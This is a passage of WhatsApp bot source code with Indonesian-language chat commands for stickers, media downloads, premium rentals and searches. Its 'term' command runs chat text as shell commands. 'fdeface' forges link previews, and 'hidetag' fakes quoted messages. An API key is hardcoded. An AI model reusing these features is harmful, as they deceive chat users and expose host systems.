		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            fakestatus(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            await limitAdd(sender, limit)
					break   
		    case 'upswteks':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (!q) return fakestatus('Isi teksnya!')
		            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
		            fakeitem(`Sukses Up story wea teks ${q}`)
		            break
		    case 'upswimage':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedImage) {
		            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
		            bur = `Sukses Upload Story Image dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply gambarnya!```')
		            }
		            break
		    case 'upswvideo':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedVideo) {
		            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
		            bur = `Sukses Upload Story Video dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply videonya!```')
		            }
		            break
		    case 'fdeface':
		            ge = args.join('')           
		            var pe = ge.split("|")[0];
		            var pen = ge.split("|")[1];
		            var pn = ge.split("|")[2];
		            var be = ge.split("|")[3];
		            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
		            if (args.length < 1) return reply (fde)
		            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
		            const bufer = fs.readFileSync(tipes)
		            const desc = `${pn}`
		            const title = `${pen}`
		            const url = `${pe}`
		            const buu = `https://${be}`
		    		var anu = {
		        	detectLinks: false
		    		}
		    		var mat = await alpha.generateLinkPreview(url)
		    		mat.title = title;
		    		mat.description = desc;
		    		mat.jpegThumbnail = bufer;
		   			mat.canonicalUrl = buu; 
		    		alpha.sendMessage(from, mat, MessageType.extendedText, anu)
		            await limitAdd(sender, limit)
					break   
		    case 'public':
		              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === false) return
		          	banChats = false
		          	//fakeitem(`「 *PUBLIC-MODE* 」`)
						sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [
            {
              buttonId: 'self',
              buttonText: {
                displayText: `Self Mode`,
              },
              type: 1,
            }]);
        break;
			case 'self':
			          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === true) return
		          	banChats = true
		          	//fakeitem(`「 *SELF-MODE* 」`)
		          	sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [
            {
              buttonId: 'public',
              buttonText: {
                displayText: `Public Mode`,
              },
              type: 1,
            }]);
        break;
		case 'revoke':
if (!isGroup) return fakegroup(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
await alpha.revokeInvite(from)
reply(lang.success())
break
		 	case 'hidetag':
		     case '_`':
		if (!mek.key.fromMe && !isGroupAdmins && !isOwner && !isCreator) return reply(lang.onlyOwner())
		     if (!isGroup) return fakegroup(lang.onlygc())
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					await limitAdd(sender, limit)
					break   
				case 'sewacheck':
				case 'ceksewa':
							if (!isGroup) return fakegroup(lang.onlygc())
							if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
							let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
							let premiumnya = `*「 SEWA EXPIRED 」*\n\n📛 *ID*: ${from}\n⏰ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
							reply(premiumnya)
							break
				case 'sewa':
							if (!isGroup)return fakegroup(lang.onlygc())
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
							if (args[0] === 'add'){
								_sewa.addSewaGroup(from, args[1], sewa)
								reply(lang.success())
								} else if (args[0] === 'del'){
									sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
									fs.writeFileSync('./src/sewa.json', JSON.stringify(sewa))
									reply(lang.success())
									} else {
										reply(`Example : *${prefix}sewa* add/del waktu`)
										}
							break
				case 'sewalist': 
				case 'listsewa':
							let txtnyee = `*「 LIST SEWA」*\nJumlah : ${sewa.length}\n\n`
							for (let i of sewa){
								let cekvipp = ms(i.expired - Date.now())
								txtnyee += `🆔 *ID :* ${i.id} \n⏰ *Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
								}
							reply(txtnyee)
							break
				case 'premium': 
							if (args.length === 0) return reply(`Kirim perintah *${prefix}premium* add/del 62xxx waktu (misal 1 hari -> 1d)\nExample:\n${prefix}premium add 62887435047326 1d`)
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args[0] === 'add') {
								if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									premium.addPremiumUser(mentioned[0], args[2], _premium)
									reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
									} else {
										premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
										reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
										}
										} else if (args[0] === 'del') {
											if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
									fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
									reply(lang.success())
									} else {
										_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
										fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
										reply(lang.success())
										}
										} else {
											reply('emror')
											}
							break
				case 'premiumcheck': case 'cekpremium': 
							if (!isPremium) return reply(`Akun kamu belum premium silahkan ${prefix}buypremium`)
							const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
							reply(`*「 PREMIUM EXPIRED 」*\n\n🆔 *ID*: ${sender}\n🏦 *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
							break
				case 'listprem': case 'listpremium':
							let txt = `「 *PREMIUM USER LIST* 」\n\n`
							let men = [];
							for (let i of _premium){
								men.push(i.id)
								const checkExp = ms(i.expired - Date.now())
								txt += `🆔 *ID :* @${i.id.split("@")[0]}\n⏰ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
								}
								mentions(txt, men, true)
							break
				case 'payment':
				let paykenekk = await getBuffer('https://telegra.ph/file/3c58eb6b1fda6c22c8668.jpg')
							sendButLocation(from, allpayment() , `Nih payment nya kak 🪀 ${enter}${enter}${botname}™© | By ${ownername}`,paykenekk,  [{"buttonId": `owner`,"buttonText": {"displayText": "OWNER"},"type": "RESPONSE"}], {})
							break
				case 'belipremium': case 'buypremium': case 'sewabot': case 'goprem':
							let sewalak = await getBuffer('https://telegra.ph/file/5e96a14f1ebaee0df2e24.jpg')
							sendButLocation(from, pc_sewa(_minggu, __minggu, ___minggu, _bulan, _permanen, __permanen) , `Jangan klik doang harus sewa beneran 😎 ${enter}${enter}${botname}™© | By ${ownername}`,sewalak,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
				case 'donasi': case 'donate':
							let donas = await getBuffer('https://telegra.ph/file/2203a91ba6216de345c3d.jpg')
							sendButLocation(from, donasibot() , `Jangan klik doang, donasi ya 🌝 ${enter}${enter}${botname}™© | By ${ownername}`,donas,  [{"buttonId": `qr_gopay1`,"buttonText": {"displayText": "QR GOPAY"},"type": "RESPONSE"},{"buttonId": `qr_dana1`,"buttonText": {"displayText": "QR DANA"},"type": "RESPONSE"},{"buttonId": `qr_ovo1`,"buttonText": {"displayText": "QR OVO"},"type": "RESPONSE"}], {})
							break
				case 'gcbot': case 'grupbot': case 'groupbot':
							let gcbot = await getBuffer('https://telegra.ph/file/09d4f9b77a0745f35bdfa.jpg')
							sendButLocation(from, gcbotwa() , `Jangan klik doang, join napa 〽️ ${enter}${enter}${botname}™© | By ${ownername}`,gcbot,  [{"buttonId": `sewabot`,"buttonText": {"displayText": "SEWABOT"},"type": "RESPONSE"}], {})
							break
				case 'infobot':
				let infobopot = await getBuffer('https://telegra.ph/file/06fad83011a4b1cecd4ba.jpg')
							sendButLocation(from, infobot(latensii, totalchat, giid, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, ownerNumberrr,runtime, kyun) , `${enter}${enter}${botname} 〽️ | By ${ownername}`,infobopot,  [{"buttonId": 'gcbot',"buttonText": {"displayText": "GROUP BOT"},"type": "RESPONSE"}], {contextInfo:{"mentionedJid": [ownerNumberrr]}})
							break
			case 'play2':
			if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                       await sendMediaURL(from, thumb, captions)
		                        sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   await limitAdd(sender, limit)
					break     
		
		               case 'sticker': case 'stikerin':
					case 'stiker': case 's':
					if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await alpha.downloadAndSaveMediaMessage(encmedia)
							//ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .input(media)
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                 })
                            .on('end', async function () {
                                console.log('Finish')
                                exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
								if (error) return reply(lang.tryAgain())
								await alpha.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fgif})
								fs.unlinkSync(media)
								fs.unlinkSync(`./sticker/${sender}.webp`)
								})
								})
                           .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(`./sticker/${sender}.webp`)
                    } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                        const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                    //    ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .inputFormat(media.split('.')[1])
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                            })
                            .on('end', async function () {
                                console.log('Finish')
                                exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
								if (error) return reply(lang.tryAgain())
								await alpha.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fgif})
								fs.unlinkSync(media)
								fs.unlinkSync(`./sticker/${sender}.webp`)
								})
								})
								.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(`./sticker/${sender}.webp`)
                    } else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        reply(mess.wait)
                        keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return reply(lang.tryAgain())
                                alpha.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: mek })
                                    fs.unlinkSync(ranw)
                                })
                            })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim\nDurasi sticker video 1-9 detik...`)
                    }
                    await limitAdd(sender, limit)
					break   
		    case 'toimg':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		if (!isQuotedSticker) return reply('Reply stc nya!')
					reply(lang.wait())
					encmediaa = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaa = await alpha.downloadAndSaveMediaMessage(encmediaa)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${mediaa} ${ran}`, (err) => {
					fs.unlinkSync(mediaa)
					if (err) return reply('Yah gagal, coba ulangi ^_^')
					buffer = fs.readFileSync(ran)
					fakethumb(buffer,'```Nih kak, jgn lupa Support YT : ZEEONE OFC```')
					fs.unlinkSync(ran)
					})
					await limitAdd(sender, limit)
					break   
			case 'ytsearch': case 'yts':
			if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join(' ');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '🐣 Title: ' + video.title + '\n'
		            ytresult += '🐤 Link: ' + video.url + '\n'
		            ytresult += '🦊 Durasi: ' + video.timestamp + '\n'
					ytresult += '🐺 Views: ' + video.views + '\n'
		            ytresult += '🦡 Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '*WHATSAPP-BOT*'
		    		await fakethumb(tbuff,ytresult)
					await limitAdd(sender, limit)
					break   
			case 'setreply':
			case 'setfake':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					fake = q
					fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
					break
			case 'setprefix':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
reply('Pke yg multi aja')
/*if (args.length < 1) return reply(`*Format Error!*\n\n*Example :*\n •${prefix + command} multi\n •${prefix + command} nopref\n •${prefix + command} #`)
if((args[0]) == 'multi'){
if(multi)return reply('_Sudah diaktifkan sebelumnya!_')
multi = true
nopref = false
single = false
reply(`_Succses mengganti Prefix ke Multiprefix!_`)
}else
if ((args[0]) == 'nopref'){
if(nopref)return reply('_Sudah diaktifkan sebelumnya!_')
multi = false
single = false
nopref = true
reply(`_Succses mengganti Prefix ke noprefix!_`)
}else
if((args[0]) == `${q}`){
multi = false
nopref = false
single = true
prefa = `${q}`
reply(`_Succses mengganti Prefix ke ${q}_`)
}*/
break
			case 'setfakeimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakeitem(`Kirim gambar dengan caption ${prefix}setfakeimg`)
		          	}
					break	
			case 'setthumb':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakegroup(`Kirim gambar dengan caption ${prefix}sethumb`)
		          	}
					break	
			case 'image':
			if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            if (args.length < 1) return fakegroup('Masukan teks!')
		            const gimg = args.join('');
		            res = await gis(gimg, google)
		            function google(error, result){
              if (error){ return reply('Not found')}
              else {
					n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,images,image,{quoted:mek})
		            }}
					await limitAdd(sender, limit)
					break   
		    
		    case 'brainly':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})             
					await limitAdd(sender, limit)
					break       
    case 'playstore':
    if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            await limitAdd(sender, limit)
					break   
		    case 'igstalk':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		       if (!q) return fakegroup('Usernamenya?')
		var halzmal = q
		            const tod = await fetchJson(`https://ferdiz-afk.my.id/api/stalkig?username=${halzmal}`);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*

\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
alpha.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
await limitAdd(sender, limit)
					break       
		
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            await limitAdd(sender, limit)
			break    
case 'lirik':
if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            await limitAdd(sender, limit)
			break  
    case 'anime':
    if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
 if(!q) return reply('Judul animenya?')
 animek(q).then(async data => {
                    let txt = `*-------「 ANIME-SEARCH 」-------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    await sendFileFromUrl(from,data[0].thumbnail,txt,msg)
                })
                .catch((err) => {
                    reply(lang.tryAgain())
                })
            break
    case 'otaku':
    if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
            if(!q) return reply('Judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
           var ram = await getBuffer(anime.img)
            alpha.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            await limitAdd(sender, limit)
			break   
    case 'komiku':
    if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            await limitAdd(sender, limit)
					break     
			case 'term':
			
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					exec(q, (err, stdout) => {
					if (err) return fakegroup(`ALPHABOT:~ ${err}`)
					if (stdout) {
					fakegroup(stdout)
					}
					})
				    break 
		    case 'join':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            hen = args[0]
		            if (!q) return fakestatus('Masukan link group')
		            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
		            var response = await alpha.acceptInvite(codeInvite)
		            fakestatus('```SUKSES JOIN GRUP```')
		            } catch {
		            fakegroup('```LINK ERROR!```')
		            }
		            break
		    case 'twmp4': case 'twitter':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
await limitAdd(sender, limit)
					break   
case 'twmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
